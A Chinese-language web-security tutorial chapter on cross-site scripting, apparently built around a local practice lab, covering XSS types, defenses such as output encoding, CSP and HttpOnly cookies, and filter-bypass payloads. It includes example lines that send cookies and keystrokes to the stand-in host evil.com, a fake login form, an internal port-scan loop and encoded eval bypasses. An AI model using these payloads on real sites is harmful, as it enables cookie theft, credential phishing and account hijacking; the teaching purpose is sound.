# 3. XSS 跨站脚本攻击

## 是什么？

XSS（Cross-Site Scripting）攻击者往网页中**注入恶意 JavaScript**，当其他用户访问该页面时，脚本在受害者浏览器中执行。

## 🧠 原理

```
1. 攻击者提交包含 <script> 的内容到网站
2. 网站没有过滤，直接保存/展示
3. 受害者访问该页面
4. <script> 在受害者浏览器中执行
5. Cookie 被盗、账号被劫持…
```

## 📊 三种类型

### 1. 反射型 XSS

恶意脚本通过 URL 参数传入，服务器直接回显在页面中：

```
http://example.com/search?q=<script>alert(1)</script>
```

- 需要诱导用户点击链接
- 一次性，不持久

### 2. 存储型 XSS

恶意脚本被存入数据库，所有访问者都中招：

```
攻击者在留言板提交：
评论内容：<script>alert(document.cookie)</script>

之后任何人打开留言板，脚本都执行
```

- 危害最大
- 持久性，影响所有用户

### 3. DOM 型 XSS

纯前端问题，恶意数据在 JavaScript 中被插入 DOM：

```javascript
// 危险代码
document.getElementById('result').innerHTML = location.hash.slice(1);
```

## 🎯 靶场练习 3：反射型 XSS

打开 `http://127.0.0.1:5000/xss/reflected`

```html
?name=<script>alert('XSS')</script>
?name=<script>alert(document.cookie)</script>
?name=<img src=x onerror=alert(1)>
```

## 🎯 靶场练习 4：存储型 XSS

打开 `http://127.0.0.1:5000/xss/stored`

在评论框输入：

```html
<script>alert('你被攻击了！')</script>
```

刷新页面，每次都会弹窗——所有访客都受影响。

## 💀 XSS 能做什么？

```javascript
// 窃取 Cookie
new Image().src = 'http://evil.com/steal?c=' + document.cookie

// 劫持登录（伪造登录框）
document.body.innerHTML = '<form action="http://evil.com">密码：<input name=pwd></form>'

// 篡改页面内容
document.querySelector('.price').innerHTML = '0.01 元'

// 键盘记录
document.onkeypress = e => new Image().src = 'http://evil.com?k=' + e.key

// 端口扫描内网
for (let i=1; i<65536; i++) {
    fetch(`http://192.168.1.${i}:8080`).catch(()=>{})
}

// 浏览器漏洞利用（BeEF 框架）
```

## 🛡️ 防御方法

### ✅ 1. 输出编码（最重要）

```
输入: <script>alert(1)</script>
HTML 实体编码后: &lt;script&gt;alert(1)&lt;/script&gt;
浏览器显示: <script>alert(1)</script>  ← 纯文本，不执行！
```

```python
# Flask/Jinja2 默认自动转义
{{ user_input }}   # ✅ 安全
{{ user_input|safe }}  # ❌ 危险！
```

### ✅ 2. Content-Security-Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

限制脚本只能从本站加载，内联脚本也不执行。

### ✅ 3. HttpOnly Cookie

```http
Set-Cookie: session=abc; HttpOnly
```

Cookie 被标记为 HttpOnly 后，JavaScript 无法读取（`document.cookie` 拿不到）。

### ✅ 4. 输入校验

- 白名单：只允许安全的标签
- 黑名单：过滤 `<script>`、`onerror` 等（容易绕过）

## 🧪 常见绕过技巧

```html
<!-- 大小写绕过 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 标签属性事件 -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- 编码绕过 -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- 无 script 标签 -->
<details open ontoggle=alert(1)>

<!-- 利用 URL -->
<a href="javascript:alert(1)">点我</a>
```

---

## 📝 练习

1. 在反射型 XSS 页面，尝试不同的 payload
2. 在存储型 XSS 页面，尝试 `alert(document.cookie)`
3. 思考：为什么有的 payload 无效？怎么绕过？

---

**下一步**：[CSRF 跨站请求伪造](04-csrf.md)
